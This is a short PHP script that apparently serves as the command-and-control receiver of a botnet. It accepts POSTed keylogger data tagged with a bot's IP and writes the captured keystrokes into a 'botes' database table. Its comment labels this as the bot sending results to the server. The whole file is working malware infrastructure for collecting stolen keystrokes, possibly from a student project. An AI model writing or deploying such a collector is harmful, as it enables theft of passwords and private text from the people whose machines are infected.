<?php
if(isset($_POST['bot']) && !empty($_POST['bot'])){
	$bot = $_POST['bot'];
	$keylogger = $_POST['keylogger'];
	
	$db = new mysqli('localhost', 'root','', 'pbl4');
	if(mysqli_connect_errno()) exit;
	//-- bot sends result to server
	$query = "UPDATE botes SET keylogger=? WHERE ip=?";
	$stmt = $db->prepare($query);
	$stmt->bind_param('ss', $keylogger, $bot); 
	$stmt->execute();
	$db->close();	
}
